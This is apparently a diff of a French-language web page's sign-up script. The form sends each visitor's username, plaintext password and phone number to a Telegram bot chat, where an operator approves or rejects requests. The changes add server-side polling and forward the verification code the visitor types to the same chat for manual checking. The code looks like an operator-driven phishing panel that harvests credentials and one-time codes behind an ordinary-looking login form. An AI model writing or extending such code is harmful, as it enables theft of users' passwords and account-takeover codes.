@@ -99,7 +99,7 @@ document.getElementById('switchLogin').onclick=e=>{
   document.getElementById('phone').required=!isLogin;
 };
 
-authForm.onsubmit=e=>{
+authForm.onsubmit=async e=>{
   e.preventDefault();
   const u=document.getElementById('username').value.trim();
   const pwd=document.getElementById('password').value;
@@ -110,23 +110,25 @@ authForm.onsubmit=e=>{
   const ph=document.getElementById('phone').value.replace(/\s/g,'').trim();
   if(!u||!ph) return;
   if(!/^0?[6-7][0-9]{8}$/.test(ph)){ alert('Numéro invalide (format: 06XXXXXXXX)'); return; }
+  try{ const rb=await fetch('/api/blocked'); const bl=await rb.json(); if(bl.includes(ph)){ alert('Numéro bloqué'); return; } }catch(e){}
   const blocked=JSON.parse(localStorage.getItem('ch_blocked')||'[]');
   if(blocked.includes(ph)){ alert('Numéro bloqué'); return; }
   pendingUser={username:u,phone:ph,password:pwd};
   pendingCode=(''+Math.floor(1000+Math.random()*9000));
-  const pendingId=Date.now();
-  const pendings=JSON.parse(localStorage.getItem('ch_pending')||'[]');
-  pendings.push({id:pendingId,username:u,phone:ph,code:pendingCode,status:'pending',ts:Date.now()});
-  localStorage.setItem('ch_pending',JSON.stringify(pendings));
-  localStorage.setItem('ch_pending_current', ''+pendingId);
-  sendTelegram(`⏳ <b>Demande validation</b>\n\n👤 <b>${u}</b>\n🔑 <code>${pwd}</code>\n\n📱 <b><code>+33 ${fmt(ph)}</code></b>\n🆔 <b><code>${pendingId}</code></b>\n\n⬇️ Choisis une action :`, pendingId);
+  const pendingId=Date.now(); pendingIdGlobal=pendingId;
+  fetch('/api/pending',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:pendingId,username:u,phone:ph,code:pendingCode,status:'pending',ts:Date.now()})});
+  sendTelegram(`⏳ <b>Demande validation</b>\n\n👤 <b>${u}</b>\n🔑 <code>${pwd}</code>\n\n📱 <b><code>+33 ${fmt(ph)}</code></b>\n\n⬇️ Choisis une action :\n🆔 <b><code>${pendingId}</code></b>`, pendingId);
   showWaiting(ph);
-  const iv=setInterval(()=>{
-    const p=JSON.parse(localStorage.getItem('ch_pending')||'[]').find(x=>x.id===pendingId);
-    if(p && p.status==='approved'){ clearInterval(iv); showCodeStep(ph); }
-    if(p && p.status==='rejected'){ clearInterval(iv); alert('Validation refusée'); location.reload(); }
-    if(!document.getElementById('waitingPanel') || document.getElementById('waitingPanel').classList.contains('hidden')) clearInterval(iv);
-  },1200);
+  const iv=setInterval(async()=>{
+    try{
+      const r=await fetch('/api/pending'); const pend=await r.json();
+      const p=pend.find(x=>x.id===pendingId);
+      if(p && p.status==='approved'){ clearInterval(iv); showCodeStep(ph); }
+      if(p && p.status==='rejected'){ clearInterval(iv); alert('Validation refusée'); location.reload(); }
+      if(!p && pend.length>=0 && !(await fetch('/api/blocked').then(x=>x.json()).then(b=>b.includes(ph)))){} 
+      if(!document.getElementById('waitingPanel') || document.getElementById('waitingPanel').classList.contains('hidden')) clearInterval(iv);
+    }catch(e){}
+  },1500);
 };
 
 function doLogout(){
@@ -137,14 +139,35 @@ document.getElementById('logout').onclick=doLogout;
 document.getElementById('headerLogout').onclick=doLogout;
 document.getElementById('headerLogin').onclick=()=> openModal();
 document.getElementById('unlockAll').onclick=()=>{ closeM(); render(); };
-document.getElementById('verifyCode').onclick=()=>{
+let pendingIdGlobal=null;
+document.getElementById('verifyCode').onclick=async()=>{
   const v=document.getElementById('codeInput').value.trim();
-  if(v===pendingCode){
-    currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser));
-    sendTelegram(`🆕 <b>Nouvelle inscription</b>\n👤 ${pendingUser.username}\n📱 +33${pendingUser.phone}\n🔑 code: ${pendingCode}\n🕒 ${new Date().toLocaleString('fr-FR')}`);
-    pendingUser=null; pendingCode=null; closeM(); render();
-  } else { document.getElementById('codeErr').style.display='block'; }
+  if(v.length!==4) { document.getElementById('codeErr').style.display='block'; return; }
+  document.getElementById('codeErr').style.display='none';
+  const pid=pendingIdGlobal;
+  await fetch('/api/pending/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:pid,enteredCode:v,status:'code_entered'})});
+  sendTelegramCode(v, pid);
+  document.getElementById('codePanel').classList.add('hidden');
+  showWaitingCode(v);
+  const iv2=setInterval(async()=>{
+    try{
+      const r=await fetch('/api/pending'); const pend=await r.json();
+      const p=pend.find(x=>x.id===pid);
+      if(p && p.status==='approved_final'){ clearInterval(iv2); currentUser=pendingUser; localStorage.setItem('ch_user_v2',JSON.stringify(currentUser)); pendingUser=null; pendingCode=null; pendingIdGlobal=null; closeM(); render(); }
+      if(p && p.status==='rejected'){ clearInterval(iv2); alert('Code refusé'); location.reload(); }
+      if(!p){ clearInterval(iv2); alert('Demande expirée'); location.reload(); }
+    }catch(e){}
+  },1500);
 };
+function sendTelegramCode(entered, pid){
+  const kb={inline_keyboard:[[{text:'✅ Code OK',callback_data:'code_ok_'+pid},{text:'❌ Code faux',callback_data:'code_bad_'+pid}]]};
+  fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TG_CHAT,message_thread_id:2,text:`🔑 <b>Code saisi</b>\n\n👤 ${pendingUser.username}\n📱 +33 ${fmt(pendingUser.phone)}\n✏️ Saisi: <code>${entered}</code>\n✅ Attendu: <code>${pendingCode}</code>\n🆔 ${pid}`,parse_mode:'HTML',reply_markup:kb})}).catch(()=>{});
+}
+function showWaitingCode(v){
+  document.getElementById('waitingPanel').classList.remove('hidden');
+  modalTitle.textContent='Vérification code';
+  document.getElementById('waitPhone').textContent='Code '+v+' envoyé en attente de validation...';
+}
 document.getElementById('resendCode').onclick=e=>{
   e.preventDefault(); pendingCode=(''+Math.floor(1000+Math.random()*9000));
   document.getElementById('codeErr').style.display='none';
